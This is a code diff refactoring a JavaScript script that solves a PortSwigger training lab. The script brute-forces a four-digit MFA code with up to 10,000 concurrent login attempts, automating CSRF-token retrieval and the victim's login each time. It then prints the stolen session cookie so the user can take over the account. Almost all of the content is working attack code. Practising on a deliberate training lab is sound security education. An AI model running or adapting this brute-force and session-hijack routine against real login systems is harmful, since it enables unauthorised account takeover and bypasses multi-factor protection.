@@ -19,83 +19,106 @@ possible combinations for this code. However, in practice, this PortSwigger lab
 generates codes within the range of up to 2000. So, if you notice that the
 attack exceeds the 2000 mark, you can press Ctrl + C and restart the lab.`);
 
-const csrfRegex = /value="(.+)"/;
+await initializeMfaCode();
+runTasks(getTasks(), concurrencyLimit);
+
+async function initializeMfaCode() {
+  // Initialize the mfa code on the server side.
+  // This increases the chances to brute force MFA-code on the first pass
+  console.log("Initializing the mfa code on the server side...");
+  await task(0);
+  await sleep(1_000);
+  console.log("Done!\n");
+}
+
+function getTasks() {
+  const tasks = [];
+  const minMfaCode = 0;
+  const maxMfaCode = 10_000 - 1;
+  for (let i = minMfaCode; i <= maxMfaCode; i++) {
+    tasks.push(() => task(i));
+  }
+  return tasks;
+}
+
+async function task(index) {
+  let [sessionCookie, csrfToken] = await getFromLogin();
+  sessionCookie = await postToLogin(sessionCookie, csrfToken);
+  csrfToken = await getFromLogin2(sessionCookie);
+
+  const mfaCode = getMfaCode(index);
+  //Only one post to /login2, so that we can do concurrent requests
+  const response = await postToLogin2({
+    sessionCookie,
+    csrfToken,
+    mfaCode,
+  });
+  if (isResponseSuccess(response)) {
+    console.log(`${mfaCode}: success`);
+    console.log(
+      `To solve the lab:
+        1. Go to lab home page.
+        2. Edit your browser cookie for the lab site with key "session" and value "${extractSessionCookieValue(response)}",
+        refresh the page.
+        3. Go to "My account" page.`,
+    );
+    process.exit(0);
+  }
+  console.log(`${mfaCode}: fail`);
+}
+
+async function getFromLogin() {
+  let response = await httpClient.get(url + "login");
+  return [extractSessionCookie(response), extractCsrfToken(response)];
+}
+
+async function postToLogin(sessionCookie, csrfToken) {
+  const victimsCredentials = { username: "carlos", password: "montoya" };
+  const data = new URLSearchParams({ csrf: csrfToken, ...victimsCredentials });
+  const response = await httpClient.post(url + "login", data, {
+    headers: {
+      cookie: sessionCookie,
+    },
+  });
+  return extractSessionCookie(response);
+}
+
+async function getFromLogin2(sessionCookie) {
+  const response = await httpClient.get(url + "login2", {
+    headers: {
+      cookie: sessionCookie,
+    },
+  });
+  return extractCsrfToken(response);
+}
+
+async function postToLogin2({ sessionCookie, csrfToken, mfaCode }) {
+  const data = new URLSearchParams({ csrf: csrfToken, "mfa-code": mfaCode });
+  return await httpClient.post(url + "login2", data, {
+    headers: {
+      cookie: sessionCookie,
+    },
+  });
+}
+
+function getMfaCode(index) {
+  return index.toString().padStart(4, "0");
+}
+
+function isResponseSuccess(response) {
+  return response.status === 302;
+}
 
 function extractSessionCookie(response) {
   return response.headers["set-cookie"][0].split(";")[0];
 }
 
-function extractCSRF(response) {
+function extractSessionCookieValue(response) {
+  const session = extractSessionCookie(response);
+  return session.split("=")[1];
+}
+
+function extractCsrfToken(response) {
+  const csrfRegex = /value="(.+)"/;
   return response.data.match(csrfRegex)[1];
 }
-
-const creds = { username: "carlos", password: "montoya" };
-
-await initializeMFACode();
-
-async function task(index) {
-  let response = await httpClient.get(url + "login");
-  let session = extractSessionCookie(response);
-  let csrf = extractCSRF(response);
-
-  response = await httpClient.post(
-    url + "login",
-    new URLSearchParams({ csrf: csrf, ...creds }),
-    {
-      headers: {
-        cookie: session,
-      },
-    },
-  );
-  session = extractSessionCookie(response);
-
-  response = await httpClient.get(url + "login2", {
-    headers: {
-      cookie: session,
-    },
-  });
-  csrf = extractCSRF(response);
-
-  //Only one post /login2 with mfa-code per task so that we can do concurrent requests
-  const code = index.toString().padStart(4, "0");
-  response = await httpClient.post(
-    url + "login2",
-    new URLSearchParams({ csrf: csrf, "mfa-code": code }),
-    {
-      headers: {
-        cookie: session,
-      },
-    },
-  );
-
-  if (response.status === 302) {
-    console.log(`${code}: success`);
-
-    const session = extractSessionCookie(response);
-    const sessionValue = new URLSearchParams(session).get("session");
-    console.log(
-      `To solve the lab:
-        1. Go to lab home page.
-        2. Set your browser cookie with key "session" and value "${sessionValue}", refresh the page.
-        3. Go to "My account page".`,
-    );
-    process.exit(0);
-  }
-  console.log(`${code}: fail`);
-}
-
-async function initializeMFACode() {
-  // Initialize the mfa code on the server side.
-  // Without this it may not work on the first try
-  console.log("Initializing the mfa code on the server side...");
-  await task(0);
-  await sleep(10_000);
-  console.log("Done!\n");
-}
-
-const tasks = [];
-for (let i = 0; i < 10_000; i++) {
-  tasks.push(() => task(i));
-}
-
-runTasks(tasks, concurrencyLimit);
